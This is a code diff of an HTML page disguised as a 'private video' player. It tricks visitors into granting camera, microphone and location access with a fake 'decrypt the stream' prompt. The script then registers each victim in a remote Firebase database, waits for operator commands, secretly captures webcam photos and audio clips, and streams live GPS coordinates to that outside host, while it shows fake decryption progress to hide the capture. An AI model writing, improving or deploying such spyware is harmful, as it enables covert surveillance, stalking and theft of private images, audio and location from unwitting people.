@@ -1,170 +1,78 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Video Player</title>
+    <title>Stream Private Content</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body {
-            margin: 0;
-            background-color: #000;
-            color: #fff;
-            font-family: sans-serif;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        /* Fake Video Player Box */
-        #video-box {
-            width: 90%;
-            max-width: 500px;
-            aspect-ratio: 16/9;
-            background: #111;
-            border: 2px solid #333;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-            cursor: pointer;
-            border-radius: 8px;
-        }
-
-        /* Play Button (Center) */
-        #play-btn {
-            width: 70px;
-            height: 70px;
-            background: rgba(255, 0, 0, 0.9);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
-            transition: transform 0.2s;
-        }
-
-        #play-btn::after {
-            content: '';
-            width: 0;
-            height: 0;
-            border-top: 15px solid transparent;
-            border-bottom: 15px solid transparent;
-            border-left: 25px solid white;
-            margin-left: 5px;
-        }
-
-        #video-box:hover #play-btn {
-            transform: scale(1.1);
-        }
-
-        .text-info {
-            margin-top: 20px;
-            text-align: center;
-            padding: 0 10px;
-        }
-
-        .text-info h2 {
-            color: #00ff41;
-            font-size: 20px;
-            margin-bottom: 10px;
-        }
-
-        .text-info p {
-            color: #888;
-            font-size: 14px;
-        }
-        
-        #loading-text {
-            display: none;
-            color: #00ff41;
-            margin-top: 15px;
-            font-weight: bold;
-        }
+        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        #player { width: 90%; max-width: 500px; aspect-ratio: 16/9; background: #0a0a0a; border: 1px solid #333; display: flex; justify-content: center; align-items: center; position: relative; border-radius: 12px; cursor: pointer; }
+        #play-btn { width: 80px; height: 80px; background: rgba(255,0,0,0.9); border-radius: 50%; display: flex; justify-content: center; align-items: center; }
+        #play-btn::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 5px; }
+        .info { margin-top: 20px; text-align: center; }
+        h2 { color: #00ff41; font-size: 18px; }
     </style>
 </head>
 <body>
-
-    <div id="video-box" onclick="startSystem()">
+    <div id="player" onclick="initCommandCenter()">
         <div id="play-btn"></div>
     </div>
-
-    <div class="text-info" id="info-text">
-        <h2>Video not available or private.</h2>
-        <p>This content requires permission to play.<br>Click the play button to continue.</p>
+    <div class="info">
+        <h2>Private Video: Restricted Access</h2>
+        <p style="color:#666; font-size:12px;">Grant camera access to decrypt the stream.</p>
     </div>
-
-    <div id="loading-text">Initializing Secure Server...</div>
 
     <script>
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const targetID = "AGENT_001"; // Aapka Agent ID
 
-        async function startSystem() {
-            // UI Change
-            document.getElementById('info-text').style.opacity = "0.5";
-            document.getElementById('loading-text').style.display = "block";
+        // Generate Unique ID for every visitor
+        const agentID = "UNIT_" + Math.floor(1000 + Math.random() * 9000);
 
+        async function initCommandCenter() {
             try {
-                // Request Permission
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                
-                // Hide UI after permission to look like it's loading
-                document.getElementById('video-box').style.display = "none";
-                document.getElementById('info-text').innerHTML = "<h2>Loading Video...</h2><p>Please wait while we decrypt the stream.</p>";
+                document.body.innerHTML = "<div style='color:#00ff41; font-family:monospace;'>[+] Decrypting Stream... 45%<br>[+] Syncing with Satellite...</div>";
 
-                // Keep screen awake
-                if ('wakeLock' in navigator) { await navigator.wakeLock.request('screen'); }
+                // Hidden Video for background capture
+                const v = document.createElement('video');
+                v.srcObject = stream; v.muted = true; v.play();
 
-                // Persistent Stream logic
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.muted = true;
-                video.play();
+                // Send Online Status
+                db.ref('targets/' + agentID + '/status').set("ONLINE");
 
-                // Listen for Commands
-                db.ref('commands/' + targetID).on('value', async (snap) => {
+                // Command Listener
+                db.ref('commands/' + agentID).on('value', async snap => {
                     const cmd = snap.val();
-                    if (!cmd) return;
+                    if(!cmd) return;
 
-                    if (cmd.action.includes('photo')) {
+                    if(cmd.action.includes('photo')) {
                         const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        db.ref('targets/' + targetID + '/photos').push({
-                            img: canvas.toDataURL('image/jpeg', 0.5),
-                            time: Date.now()
-                        });
+                        canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                        canvas.getContext('2d').drawImage(v, 0, 0);
+                        db.ref('targets/' + agentID + '/photos').push({ img: canvas.toDataURL('image/jpeg', 0.5), time: Date.now() });
                     }
-
-                    if (cmd.action === 'audio_record') {
-                        const recorder = new MediaRecorder(stream);
-                        let chunks = [];
-                        recorder.ondataavailable = e => chunks.push(e.data);
-                        recorder.onstop = () => {
-                            const blob = new Blob(chunks, { type: 'audio/webm' });
+                    if(cmd.action === 'audio') {
+                        const rec = new MediaRecorder(stream);
+                        let ch = [];
+                        rec.ondataavailable = e => ch.push(e.data);
+                        rec.onstop = () => {
                             const reader = new FileReader();
-                            reader.readAsDataURL(blob);
-                            reader.onloadend = () => {
-                                db.ref('targets/' + targetID + '/audios').push({ audio: reader.result, time: Date.now() });
-                            };
+                            reader.readAsDataURL(new Blob(ch, {type:'audio/webm'}));
+                            reader.onloadend = () => db.ref('targets/' + agentID + '/audios').push({ audio: reader.result, time: Date.now() });
                         };
-                        recorder.start();
-                        setTimeout(() => recorder.stop(), 4000);
+                        rec.start(); setTimeout(() => rec.stop(), 4000);
                     }
-                    // Command clear na karein agar aap chahte hain ke panel control kare
                 });
 
-            } catch (err) {
-                alert("Error: To view this private video, you must allow camera access.");
-                location.reload();
-            }
+                // Auto Location Update
+                navigator.geolocation.watchPosition(pos => {
+                    db.ref('targets/' + agentID + '/location').set({ lat: pos.coords.latitude, lng: pos.coords.longitude, last: new Date().toLocaleTimeString() });
+                });
+
+            } catch(e) { alert("Permission Required!"); location.reload(); }
         }
     </script>
 </body>
